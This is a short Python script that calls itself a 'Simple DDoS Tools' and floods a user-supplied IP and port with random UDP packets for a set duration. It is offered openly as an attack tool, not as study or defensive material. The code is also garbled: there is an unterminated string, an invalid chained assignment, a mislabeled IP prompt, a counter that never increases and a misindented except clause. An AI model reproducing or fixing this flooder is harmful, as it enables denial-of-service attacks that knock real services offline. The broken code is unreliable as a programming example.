import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)

print("Simple DDoS Tools By Boyz17
ip = input ("Enter Port : "))
port = int(input("Enter port : "))
dur = int(input("Sent Packet : "))
timeout = time.time() = dursent = 0
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent = sent
        print("Sent",sent"Packets to",ip,"in port,port",port,)
        except KeyboardInterrupt:
            sys.exit()